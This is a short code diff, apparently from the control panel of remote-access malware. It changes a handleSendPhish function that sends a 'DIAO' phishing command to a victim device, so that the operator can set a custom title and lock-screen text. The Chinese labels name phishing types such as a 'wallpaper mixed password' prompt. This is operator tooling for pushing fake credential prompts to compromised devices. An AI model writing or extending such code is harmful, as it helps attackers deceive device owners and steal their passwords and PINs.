@@ -447,15 +447,15 @@ const phishTypeNames: Record<string, string> = {
     '3': '壁纸混合密码',
 };
 
-const handleSendPhish = (type: string) => {
+const handleSendPhish = (type: string, title: string, content: string) => {
     // 使用 DIAO 命令，与 info.php 保持一致
     send({ 
         itype: 'slr_panelsend', 
         subc: 'DIAO', 
         pid: deviceId.value, 
         pin: '',
-        title: '',
-        lckdis: '',
+        title: title,
+        lckdis: content,
         typ: type 
     });
     message.success(`钓鱼请求已发送 (${phishTypeNames[type] || type})`);
